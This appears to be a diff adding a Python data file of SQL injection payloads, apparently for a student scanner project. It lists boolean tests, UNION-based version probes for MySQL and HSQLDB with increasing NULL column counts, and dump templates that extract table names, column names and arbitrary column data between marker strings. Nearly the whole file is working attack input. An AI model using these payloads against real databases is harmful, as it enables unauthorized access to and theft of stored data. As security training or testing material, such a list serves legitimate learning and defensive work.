@@ -1,0 +1,81 @@
+injections = {
+    # Boolean
+    "numeric": ["1 OR 1=1", "1 OR 1=2"],
+    "string": ["' OR '1'='1", "' OR '1'='2"],
+    # Union
+    "mysql_num": ["1 UNION SELECT @@version; -- ",
+        "1 UNION SELECT NULL,@@version; -- ",
+        "1 UNION SELECT NULL,NULL,@@version; -- ",
+        "1 UNION SELECT NULL,NULL,NULL,@@version; -- ",
+        "1 UNION SELECT NULL,NULL,NULL,NULL,@@version; -- ",
+        "1 UNION SELECT NULL,NULL,NULL,NULL,NULL,@@version; -- ",
+        "1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,@@version; -- ",
+        "1 UNION SELECT NULL,NULL,NULL,1",
+    ],
+    "mysql_str": ["1' UNION SELECT @@version; -- ",
+        "1' UNION SELECT NULL,@@version; -- ",
+        "1' UNION SELECT NULL,NULL,@@version; -- ",
+        "1' UNION SELECT NULL,NULL,NULL,@@version; -- ",
+        "1' UNION SELECT NULL,NULL,NULL,NULL,@@version; -- ",
+        "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,@@version; -- ",
+        "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,@@version; -- ",
+    ],
+    "hsqldb_num": [
+        "1 union select character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1 union select null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1 union select character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1 union select null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1 union select null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1 union select character_value,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1 union select null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1 union select null,null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1 union select null,character_value,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1 union select character_value,null,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1 union select null,null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1 union select null,null,null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1 union select null,null,null,null,null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+    ],
+    "hsqldb_str": [
+        "1' union select character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select character_value,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select null,null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select null,character_value,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select character_value,null,null,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select null,null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select null,null,null,null,null,character_value from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select null,null,null,null,null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "1' union select null,null,null,null,null,character_value,null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+    ],
+}
+
+        # Dump ------- Main separator: '42malaga', second: 'telefonica'
+inject_dump = {
+    "sql": {
+        "version": "' UNION SELECT NULL, CONCAT('42malaga',@@version,'42malaga'); -- ",
+        "tables": "' UNION SELECT NULL, CONCAT('42malaga',table_catalog,'telefonica',table_name,'42malaga') FROM information_schema.tables; -- ",
+        "columns": "' UNION SELECT NULL, CONCAT('42malaga',table_name,'telefonica',column_name,'42malaga') FROM information_schema.columns; -- ",
+        "key": "id",
+        "payload": "' UNION SELECT NULL, CONCAT('42malaga',{col},'42malaga') FROM {tab}; -- ",
+    },
+
+    "hsqldb_n": {
+        "version": "1 union select null,null,null,null,null,'42malaga'||character_value||'42malaga',null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "tables": "1 union select null,null,null,null,null,'42malaga'||table_catalog||'telefonica'||table_name||'42malaga',null from information_schema.tables; -- ",
+        "columns": "1 union select null,null,null,null,null,'42malaga'||table_name||'telefonica'||column_name||'42malaga',null from information_schema.columns; -- ",
+        "key": "userid",
+        "payload": "1 union select null,null,null,null,null,'42malaga'||{col}||'42malaga',null from {tab}; -- ",
+    },
+
+    "hsqldb": {
+        "version": "' union select null,null,null,null,null,'42malaga'||character_value||'42malaga' from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "tables": "' union select null,null,null,null,null,'42malaga'||table_catalog||'telefonica'||table_name||'42malaga' from information_schema.tables; -- ",
+        "columns": "' union select null,null,null,null,null,'42malaga'||table_name||'telefonica'||column_name||'42malaga' from information_schema.columns; -- ",
+        "key": "auth_tan",
+        "payload": "' union select null,null,null,null,null,'42malaga'||{col}||'42malaga' from {tab}; -- ",
+    },
+}
